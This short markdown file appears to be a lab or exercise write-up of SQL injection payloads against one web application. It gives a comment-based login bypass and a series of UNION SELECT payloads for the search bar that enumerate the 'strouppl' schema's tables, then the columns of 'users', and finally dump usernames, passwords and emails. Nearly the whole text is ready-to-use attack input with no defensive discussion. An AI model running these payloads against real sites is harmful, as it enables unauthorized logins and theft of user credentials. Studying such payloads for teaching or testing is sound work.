# SQL injections

## Access to an account via the login interface

`username'; --`

## Access to informations via the searchbar
### Select tables from the database

`aaaaa' UNION SELECT table_schema, table_name, table_schema, table_name FROM information_schema.tables WHERE table_schema = 'strouppl';--`

### Select columns from the table

`aaaaa' UNION SELECT column_name, table_name, column_name, table_name FROM information_schema.columns WHERE table_name = 'users';--`

### Select the data from the table

`aaaaa' UNION SELECT username, username, password, email FROM users;--`